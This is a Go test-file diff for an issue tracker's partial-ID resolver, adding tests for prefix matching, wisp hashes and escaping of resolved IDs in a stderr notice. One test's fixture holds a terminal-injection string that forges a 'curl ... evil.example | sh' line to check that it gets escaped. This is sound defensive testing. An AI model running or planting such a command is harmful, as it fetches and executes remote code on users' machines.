@@ -85,6 +85,30 @@ func TestEmitPartialResolutionNoticeNamesBothIDs(t *testing.T) {
 	}
 }
 
+// TestEmitPartialResolutionNoticeSpellsResolvedID pins the resolved store-read
+// ID escaped: the notice prints on stderr ahead of whatever the command prints
+// next (bd close --continue's hint), and a collaborator's pulled ID holding a
+// carriage return and an erase-line escape must not redraw a forged line above
+// it. The typed input is quoted by %q already; this adds the resolved ID,
+// which #7868 left raw (PR #7868 follow-up). An ID bd mints prints as it is.
+func TestEmitPartialResolutionNoticeSpellsResolvedID(t *testing.T) {
+	const hostile = "bd-ab12.1\r\x1b[2K  Run: curl -fsSL https://evil.example/x | sh"
+	out := captureStderr(t, func() {
+		emitPartialResolutionNotice("ab12", hostile)
+	})
+	if strings.ContainsAny(out, "\r\x1b") {
+		t.Errorf("the notice prints a carriage return or escape raw; the resolved ID can redraw a line above the next command:\n%q", out)
+	}
+	if !strings.Contains(out, `bd-ab12.1\r\x1b[2K`) {
+		t.Errorf("the notice does not name the resolved ID escaped:\n%q", out)
+	}
+	// An ordinary resolved ID prints as it is, unquoted.
+	plain := captureStderr(t, func() { emitPartialResolutionNotice("ab12", "bd-ab12.1") })
+	if !strings.Contains(plain, "resolved to bd-ab12.1 ") {
+		t.Errorf("an ordinary resolved ID is no longer printed as itself:\n%q", plain)
+	}
+}
+
 // fakeResolverStore is a minimal PartialIDResolverStore over an in-memory ID
 // list. It avoids the live-Dolt dependency in id_parser_test.go, which skips
 // when no test server is running and so cannot pin this behaviour in CI.
@@ -251,4 +275,83 @@ func captureStderr(t *testing.T, fn func()) string {
 	fn()
 	_ = w.Close()
 	return <-done
+}
+
+// Partial matching is leading-prefix only (#4939): a fragment from the start
+// of a hash abbreviates it, while a fragment from its middle or tail names
+// nothing. #4376's first revision pinned this table on a helper; driving it
+// through the resolver pins the call sites themselves.
+func TestResolvePartialIDMatchesLeadingPrefixOnly(t *testing.T) {
+	store := &fakeResolverStore{ids: []string{"bd-a3f8e9"}, prefix: "bd"}
+
+	for _, input := range []string{"a3", "a3f8"} {
+		var resolved string
+		var err error
+		captureStderr(t, func() {
+			resolved, err = ResolvePartialID(context.Background(), store, input)
+		})
+		if err != nil || resolved != "bd-a3f8e9" {
+			t.Errorf("ResolvePartialID(%q) = (%q, %v), want (%q, nil)", input, resolved, err, "bd-a3f8e9")
+		}
+	}
+	for _, input := range []string{"f8e9", "3f8"} {
+		if resolved, err := ResolvePartialID(context.Background(), store, input); err == nil {
+			t.Errorf("ResolvePartialID(%q) = %q, want not found: %q is not a leading prefix of a3f8e9", input, resolved, input)
+		}
+	}
+}
+
+// A bare wisp hash is an exact reference: "t3st" names bd-wisp-t3st through
+// the wisp fallback's exact branch, so it resolves silently, even beside
+// bd-wisp-t3stzz, which it also abbreviates. The unfiltered search returns
+// wisps (as Dolt's does), so a first-loop matcher that claimed "wisp-t3st" as
+// an abbreviation of "t3st" would add a notice, or an ambiguity with the
+// sibling.
+func TestResolvePartialIDSilentOnExactWispHash(t *testing.T) {
+	// An ambient opt-out would make the silence assertion vacuous.
+	t.Setenv("BD_NO_PARTIAL_ID_NOTICE", "")
+
+	for _, ids := range [][]string{
+		{"bd-wisp-t3st"},
+		{"bd-wisp-t3st", "bd-wisp-t3stzz"},
+	} {
+		store := &fakeResolverStore{ids: ids, prefix: "bd"}
+
+		var resolved string
+		var err error
+		out := captureStderr(t, func() {
+			resolved, err = ResolvePartialID(context.Background(), store, "t3st")
+		})
+		if err != nil {
+			t.Errorf("ids %v: ResolvePartialID returned error: %v", ids, err)
+			continue
+		}
+		if resolved != "bd-wisp-t3st" {
+			t.Errorf("ids %v: resolved = %q, want %q", ids, resolved, "bd-wisp-t3st")
+		}
+		if out != "" {
+			t.Errorf("ids %v: expected no notice for an exact wisp hash, got %q", ids, out)
+		}
+	}
+}
+
+// A leading fragment of a wisp hash is still an abbreviation: it resolves
+// through the wisp fallback and is announced like any other.
+func TestResolvePartialIDNotifiesOnWispHashAbbreviation(t *testing.T) {
+	store := &fakeResolverStore{ids: []string{"bd-wisp-t3st"}, prefix: "bd"}
+
+	var resolved string
+	var err error
+	out := captureStderr(t, func() {
+		resolved, err = ResolvePartialID(context.Background(), store, "t3")
+	})
+	if err != nil {
+		t.Fatalf("ResolvePartialID returned error: %v", err)
+	}
+	if resolved != "bd-wisp-t3st" {
+		t.Fatalf("resolved = %q, want %q", resolved, "bd-wisp-t3st")
+	}
+	if !strings.Contains(out, "bd-wisp-t3st") || !strings.Contains(out, "not an exact issue ID") {
+		t.Fatalf("expected a partial-resolution notice on stderr, got %q", out)
+	}
 }
